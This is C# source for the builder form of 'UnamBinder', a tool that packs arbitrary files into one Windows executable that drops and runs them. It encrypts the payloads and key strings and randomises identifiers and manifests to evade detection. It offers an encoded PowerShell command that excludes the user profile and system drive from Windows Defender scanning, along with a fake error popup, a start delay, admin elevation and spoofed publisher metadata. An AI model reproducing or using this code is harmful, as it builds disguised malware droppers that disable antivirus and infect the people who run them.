using FormSerialisation;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace UnamBinder
{
    public partial class Builder : Form
    {
        private static Random random = new Random();
        public Vanity vanity = new Vanity();

        private string CKEY;
        private string AESKEY;
        private string SALT;
        private string IV;

        public List<string> stringCache = new List<string>();

        public Builder()
        {
            InitializeComponent();
        }

        public void ManagedCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v4.0");
            var CodeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters();
            string OP = " /target:winexe ";

            CreateManifest(savePath + ".manifest", chkAdmin.Checked);
            OP += " /win32manifest:\"" + savePath + ".manifest" + "\"";

            if (vanity.chkIcon.Checked)
            {
                OP += " /win32icon:\"" + vanity.txtIconPath.Text + "\"";
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = OP;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");

            var sb = new StringBuilder(Properties.Resources.ProgramCS);

            if (vanity.chkAssembly.Checked)
            {
                sb.Replace("DefAssembly", "true");
                sb.Replace("%Title%", ToLiteral(vanity.txtAssemblyTitle.Text));
                sb.Replace("%Description%", ToLiteral(vanity.txtAssemblyDescription.Text));
                sb.Replace("%Company%", ToLiteral(vanity.txtAssemblyCompany.Text));
                sb.Replace("%Product%", ToLiteral(vanity.txtAssemblyProduct.Text));
                sb.Replace("%Copyright%", ToLiteral(vanity.txtAssemblyCopyright.Text));
                sb.Replace("%Trademark%", ToLiteral(vanity.txtAssemblyTrademark.Text));
                sb.Replace("%Version%", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
            }

            ReplaceGlobals(ref sb, true);

            string parentid = RandomString(16, true, true);
            using (var R = new System.Resources.ResourceWriter(parentid + ".Resources"))
            {
                string resourceid = RandomString(16, true, true);

                List<string> stringarray = new List<string>();
                int count = listFiles.Items.Count;
                for (int i = 0; i < count; i++)
                {
                    File filevar = (File)listFiles.Items[i];
                    try
                    {
                        R.AddResource(resourceid, AES_Encryptor(System.IO.File.ReadAllBytes(filevar.txtBindfile.Text)));
                        stringarray.Add("new string[] {" + $"\"{EncryptString(filevar.comboDropLocation.Text)}\", \"{EncryptString(filevar.txtFilename.Text)}\", \"{resourceid}\", \"{EncryptString(filevar.toggleExecute.Checked ? "true" : "false")}\"" + "}");
                    }
                    catch
                    {
                        if (BuildErrorTest(true, "Error: Could not read the file: " + filevar.txtBindfile.Text + ", make sure that the file exists and that the path is correct.")) return;
                    }
                }

                sb.Replace("$ARRAYCOUNT", count.ToString());
                sb.Replace("$STRINGARRAY", string.Join(",", stringarray));

                R.Generate();
            }
            parameters.EmbeddedResources.Add(parentid + ".Resources");
            sb.Replace("#RESPARENT", parentid);

            var Results = CodeProvider.CompileAssemblyFromSource(parameters, sb.ToString());

            try
            {
                System.IO.File.Delete(savePath + ".manifest");
                System.IO.File.Delete(parentid + ".Resources");
            }
            catch { }

            if (Results.Errors.HasErrors)
            {
                foreach (CompilerError E in Results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        public void NativeCompiler(string savePath)
        {
            try
            {
                btnBuild.Text = "Building";
                btnBuild.Enabled = false;

                string currentDirectory = Path.GetDirectoryName(savePath);
                string filename = Path.GetFileNameWithoutExtension(savePath);

                Dictionary<string, string> paths = new Dictionary<string, string>(){
                        { "current", currentDirectory },
                        { "compilerslog", Path.Combine(currentDirectory, "Compilers\\logs") },
                        { "windres", Path.Combine(currentDirectory, "Compilers\\MinGW64\\bin\\windres.exe") },
                        { "tcc", Path.Combine(currentDirectory, "Compilers\\tinycc\\tcc.exe") },
                        { "windreslog", Path.Combine(currentDirectory, "Compilers\\logs\\windres.log") },
                        { "tcclog", Path.Combine(currentDirectory, "Compilers\\logs\\tcc.log") },
                        { "manifest", Path.Combine(currentDirectory, "loader.manifest") },
                        { "resource.rc", Path.Combine(currentDirectory, "resource.rc") },
                        { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                        { "filename", Path.Combine(currentDirectory, filename) }
                    };
                ExtractExternalFiles(currentDirectory);

                char[] directoryFilter = CheckNonASCII(savePath);

                if (BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter)))) return;

                if (BuildErrorTest(chkDelay.Checked && !txtDelay.Text.All(char.IsDigit), "Error: Start Delay must be a number.")) return;

                if (BuildErrorTest(!string.Join("", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }).All(char.IsDigit), "Error: Assembly Version must only contain numbers.")) return;

                StringBuilder resource = new StringBuilder(Properties.Resources.resource);
                string defs = "";
                if (vanity.chkIcon.Checked)
                {
                    resource.Replace("#ICON", ToLiteral(vanity.txtIconPath.Text));
                    defs += " -DDefIcon";
                }

                if (vanity.chkAssembly.Checked)
                {
                    resource.Replace("#TITLE", ToLiteral(vanity.txtAssemblyTitle.Text));
                    resource.Replace("#DESCRIPTION", ToLiteral(vanity.txtAssemblyDescription.Text));
                    resource.Replace("#COMPANY", ToLiteral(vanity.txtAssemblyCompany.Text));
                    resource.Replace("#PRODUCT", ToLiteral(vanity.txtAssemblyProduct.Text));
                    resource.Replace("#COPYRIGHT", ToLiteral(vanity.txtAssemblyCopyright.Text));
                    resource.Replace("#TRADEMARK", ToLiteral(vanity.txtAssemblyTrademark.Text));
                    resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
                    defs += " -DDefAssembly";
                }
                CreateManifest(paths["manifest"], chkAdmin.Checked);
                System.IO.File.WriteAllText(paths["resource.rc"], resource.ToString());
                RunExternalProgram(
                    "cmd",
                    string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff -F pe-i386 {1}", paths["windres"], defs),
                    currentDirectory,
                    paths["windreslog"]
                );
                System.IO.File.Delete(paths["resource.rc"]);
                System.IO.File.Delete(paths["manifest"]);
                if (BuildErrorTest(!System.IO.File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"]))) return;

                StringBuilder sb = new StringBuilder(Properties.Resources.ProgramC);
                ReplaceGlobals(ref sb, false);

                List<string> stringarray = new List<string>();
                List<string> intarray = new List<string>();
                int count = listFiles.Items.Count;
                for (int i = 0; i < count; i++)
                {
                    File filevar = (File)listFiles.Items[i];
                    try
                    {
                        byte[] filebytes = System.IO.File.ReadAllBytes(filevar.txtBindfile.Text);
                        stringarray.Add("{" + $"\"{ToLiteral(Cipher(filevar.comboDropLocation.Text))}\", \"{ToLiteral(Cipher(filevar.txtFilename.Text))}\", \"{ToLiteral(Cipher(filebytes))}\"" + "}");
                        intarray.Add("{" + $"{filevar.comboDropLocation.Text.Length}, {filevar.txtFilename.Text.Length}, {filebytes.Length}, {(filevar.toggleExecute.Checked ? "1" : "0")}" + "}");
                    }
                    catch
                    {
                        if (BuildErrorTest(true, "Error: Could not read the file: " + filevar.txtBindfile.Text + ", make sure that the file exists and that the path is correct.")) return;
                    }
                }

                sb.Replace("$ARRAYCOUNT", count.ToString());
                sb.Replace("$STRINGARRAY", string.Join(",", stringarray));
                sb.Replace("$INTARRAY", string.Join(",", intarray));

                System.IO.File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
                RunExternalProgram(
                        paths["tcc"],
                        string.Format("-Wall -Wl,-subsystem=windows \"{0}\" {1} -luser32 -lshell32 -m32", paths["filename"] + ".c", "resource.o"),
                        currentDirectory,
                        paths["tcclog"]
                    );
                System.IO.File.Delete(paths["resource.o"]);
                System.IO.File.Delete(paths["filename"] + ".c");

                if (BuildErrorTest(!System.IO.File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"]))) return;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: An error occured while building the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            btnBuild.Enabled = true;
            btnBuild.Text = "Build";
        }

        public void ReplaceGlobals(ref StringBuilder stringb, bool csharp)
        {
            CipherReplace(stringb, "#STROPEN", "open", csharp);
            CipherReplace(stringb, "#STRPOWERSHELL", "powershell", csharp);
            CipherReplace(stringb, "#STRCMD", "cmd", csharp);
            CipherReplace(stringb, "#STRTRUE", "true", csharp);
            stringb.Replace("#STRCURDIR", csharp ? EncryptString("Current Directory") : ToLiteral(Cipher("Current Directory")));

            stringb.Replace("#DKEYLENGTH", CKEY.Length.ToString());
            stringb.Replace("#DKEY", CKEY);

            stringb.Replace("#AESKEY", AESKEY);
            stringb.Replace("#SALT", SALT);
            stringb.Replace("#IV", IV);

            if (chkError.Checked)
            {
                stringb.Replace("DefError", csharp ? "true" : "TRUE");
                CipherReplace(stringb, "#ERRORCOMMAND", $"-EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{RandomString(3, true)}#>Add-Type -AssemblyName System.Windows.Forms;<#{RandomString(3, true)}#>[System.Windows.Forms.MessageBox]::Show('{txtErrorText.Text.Replace("'", "''").Replace("\"", @"\""""")}','','OK','{(comboErrorType.Text == "Info" ? "Information" : comboErrorType.Text)}')<#{RandomString(3, true)}#>"))}\"", csharp);
            }

            if (chkWD.Checked)
            {
                stringb.Replace("DefWD", csharp ? "true" : "TRUE");
                CipherReplace(stringb, "#WDCOMMAND", $"-EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{RandomString(3, true)}#>Add-MpPreference <#{RandomString(3, true)}#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#{RandomString(3, true)}#> -Force <#{RandomString(3, true)}#>"))}\"", csharp);
            }

            if (chkDelay.Checked)
            {
                stringb.Replace("DefDelay", csharp ? "true" : "TRUE");
                stringb.Replace("#DELAY", txtDelay.Text);
            }

            foreach (Match m in Regex.Matches(stringb.ToString(), "_r(.+?)_"))
            {
                foreach (Capture c in m.Captures)
                    stringb.Replace(c.Value, RandomString(random.Next(5, 40), true, true));
            }
        }

        public static void ExtractExternalFiles(string currentDirectory)
        {
            var paths = new Dictionary<string, string>() {
                    { "compilers", Path.Combine(currentDirectory, "Compilers") } };

            if (!Directory.Exists(paths["compilers"]))
            {
                using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
                {
                    archive.ExtractToDirectory(paths["compilers"]);
                }
            }
        }

        public void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = filename;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.WorkingDirectory = workingDirectory;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                using (StreamWriter writer = System.IO.File.AppendText(logpath))
                {
                    writer.Write(process.StandardError.ReadToEnd());
                }
                process.WaitForExit();
            }
        }

        public bool BuildErrorTest(bool condition, string message)
        {
            if (condition)
            {
                MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                btnBuild.Enabled = true;
                btnBuild.Text = "Build";
                return true;
            }
            return false;
        }

        public string RandomString(int length, bool simple = false, bool useCache = false)
        {
            while (true)
            {
                string chars = "abcdefghijklmnpqrstuvwxyz" + (simple ? "" : "0123456789!$&()*+,-./:<=>@[]^_");
                int clength = simple ? 25 : 55;
                var buffer = new char[length];
                for (var i = 0; i < length; ++i)
                {
                    buffer[i] = chars[random.Next(clength)];
                }

                string result = new string(buffer);
                if (useCache)
                {
                    if (!stringCache.Contains(result))
                    {
                        stringCache.Add(result);
                        return result;
                    }
                }
                else
                {
                    return result;
                }
            }
        }

        public string Cipher(dynamic data)
        {
            int length = CKEY.Length;
            var result = new char[data.Length];
            for (int c = 0; c < data.Length; c++)
                result[c] = (char)((uint)data[c] ^ CKEY[c % length]);
            return string.Join("", result);
        }

        public byte[] AES_Encryptor(byte[] input)
        {
            using (Aes aesAlg = Aes.Create())
            {
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(new Rfc2898DeriveBytes(AESKEY, Encoding.ASCII.GetBytes(SALT), 100).GetBytes(16), Encoding.ASCII.GetBytes(IV));
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        csEncrypt.Write(input, 0, input.Length);
                        csEncrypt.Close();
                    }
                    return msEncrypt.ToArray();
                }
            }
        }

        public string EncryptString(string input)
        {
            return Convert.ToBase64String(AES_Encryptor(Encoding.UTF8.GetBytes(input)));
        }

        public void CipherReplace(StringBuilder source, string id, string value, bool csharp)
        {
            source.Replace($"\"{id}\"", csharp ? $"_rGetString_(\"{EncryptString(value)}\")" : $"cipher(\"{ToLiteral(Cipher(value))}\", {value.Length})");
        }

        private static string ToLiteral(string input)
        {
            var literal = new StringBuilder(input.Length + 2);

            foreach (var c in input)
            {
                switch (c)
                {
                    case '\"': literal.Append(@"\u0022"); break;
                    case '\\': literal.Append(@"\\"); break;
                    case '\0': literal.Append(@"\u0000"); break;
                    case '\a': literal.Append(@"\a"); break;
                    case '\b': literal.Append(@"\b"); break;
                    case '\f': literal.Append(@"\f"); break;
                    case '\n': literal.Append(@"\n"); break;
                    case '\r': literal.Append(@"\r"); break;
                    case '\t': literal.Append(@"\t"); break;
                    case '\v': literal.Append(@"\v"); break;
                    default:
                        literal.Append(c);
                        break;
                }
            }
            return literal.ToString();
        }

        public static char[] CheckNonASCII(string text)
        {
            return text.Where(c => c > 127).ToArray();
        }

        public void CreateManifest(string path, bool administrator)
        {
            var mb = new StringBuilder(Properties.Resources.template);
            mb.Replace("#MANIFESTVERSION", $"{random.Next(0, 10)}.{random.Next(0, 10)}.{random.Next(0, 10)}.{random.Next(0, 10)}");
            mb.Replace("#MANIFESTNAME", RandomString(random.Next(10, 40), true));
            mb.Replace("#MANIFESTLEVEL", administrator ? "requireAdministrator" : "asInvoker");
            System.IO.File.WriteAllText(path, mb.ToString());
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = filter;
            dialog.InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        public string LoadDialog(string filter)
        {
            OpenFileDialog dialog = new OpenFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            File add = new File();
            add.Show();
            listFiles.Items.Add(add);
        }

        private void btnEdit_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Show();
            }
        }

        private void btnRemove_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Hide();
                listFiles.Items.Remove(listFiles.SelectedItem);
            }
        }

        private void linkGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/UnamBinder");
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (listFiles.Items.Count == 0)
            {
                MessageBox.Show("You need to add at least one file to bind before building.", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string save = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            if (save.Length > 0)
            {
                CKEY = RandomString(32);
                AESKEY = RandomString(256, true);
                SALT = RandomString(32, true);
                IV = RandomString(16, true);

                if (radioBuildNative.Checked)
                {
                    NativeCompiler(save);
                }
                else
                {
                    ManagedCompiler(save);
                }
            }
        }

        private void btnVanity_Click(object sender, EventArgs e)
        {
            vanity.Show();
        }

        private void checkError_CheckedChanged(object sender)
        {
            txtErrorText.Visible = chkError.Checked;
            comboErrorType.Visible = chkError.Checked;
        }

        private void checkDelay_CheckedChanged(object sender)
        {
            txtDelay.Visible = chkDelay.Checked;
            labelDelay.Visible = chkDelay.Checked;
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            string savepath = SaveDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(savepath))
            {
                FormSerializer.Serialise(new List<Control>() { this, vanity }, savepath);
            }
        }

        private void btnLoad_Click(object sender, EventArgs e)
        {
            string loadpath = LoadDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(loadpath))
            {
                try
                {
                    FormSerializer.Deserialise(new List<Control>() { this, vanity }, loadpath);
                    try
                    {
                        if (System.IO.File.Exists(vanity.txtIconPath.Text))
                        {
                            vanity.imageIcon.ImageLocation = vanity.txtIconPath.Text;
                        }
                    }
                    catch { }
                }
                catch
                {
                    MessageBox.Show("Could not parse the configuration file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}
